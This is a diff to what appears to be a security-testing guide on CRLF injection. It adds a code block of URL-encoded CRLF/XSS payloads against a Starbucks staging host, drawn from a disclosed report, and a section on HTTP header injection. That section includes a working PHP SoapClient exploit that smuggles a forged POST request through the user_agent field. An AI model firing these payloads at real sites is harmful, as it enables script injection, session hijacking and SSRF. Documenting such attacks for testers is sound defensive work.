@@ -74,6 +74,46 @@ http://www.example.com/somepage.php?page=%0d%0aContent-Length:%200%0d%0a%0d%0aHT
 
 You can send the payload **inside the URL path** to control the **response** from the server (example from [here](https://hackerone.com/reports/192667)):
 
-`http://stagecafrstore.starbucks.com/%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E
-http://stagecafrstore.starbucks.com/%3f%0D%0ALocation://x:1%0D%0AContent-Type:text/html%0D%0AX-XSS-Protection%3a0%0D%0A%0D%0A%3Cscript%3Ealert(document.domain)%3C/script%3E`
+```js
+http://stagecafrstore.starbucks.com/%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E
+http://stagecafrstore.starbucks.com/%3f%0D%0ALocation://x:1%0D%0AContent-Type:text/html%0D%0AX-XSS-Protection%3a0%0D%0A%0D%0A%3Cscript%3Ealert(document.domain)%3C/script%3E
+```
+
+---
+## HTTP Header Injection
+
+>HTTP Header Injection, often exploited through CRLF (Carriage Return and Line Feed) injection, allows attackers to insert HTTP headers. This can undermine security mechanisms such as XSS (Cross-Site Scripting) filters or the SOP (Same-Origin Policy), potentially leading to unauthorized access to sensitive data, such as CSRF tokens, or the manipulation of user sessions through cookie planting.
+
+#### Exploiting CORS via HTTP Header Injection
+
+An attacker can inject HTTP headers to enable CORS (Cross-Origin Resource Sharing), bypassing the restrictions imposed by SOP. This breach allows scripts from malicious origins to interact with resources from a different origin, potentially accessing protected data.
+
+#### SSRF and HTTP Request Injection via CRLF
+
+CRLF injection can be utilized to craft and inject an entirely new HTTP request. A notable example of this is the vulnerability in PHP's `SoapClient` class, specifically within the `user_agent` parameter. By manipulating this parameter, an attacker can insert additional headers and body content, or even inject a new HTTP request entirely. Below is a PHP example demonstrating this exploitation:
+
+```php
+$target = 'http://127.0.0.1:9090/test';
+$post_string = 'variable=post value';
+$crlf = array(
+    'POST /proxy HTTP/1.1',
+    'Host: local.host.htb',
+    'Cookie: PHPSESSID=[PHPSESSID]',
+    'Content-Type: application/x-www-form-urlencoded',
+    'Content-Length: '.(string)strlen($post_string),
+    "\r\n",
+    $post_string
+);
+
+$client = new SoapClient(null,
+    array(
+        'uri'=>$target,
+        'location'=>$target,
+        'user_agent'=>"IGN\r\n\r\n".join("\r\n",$crlf)
+    )
+);
+
+# Put a netcat listener on port 9090
+$client->__soapCall("test", []);
+```
 
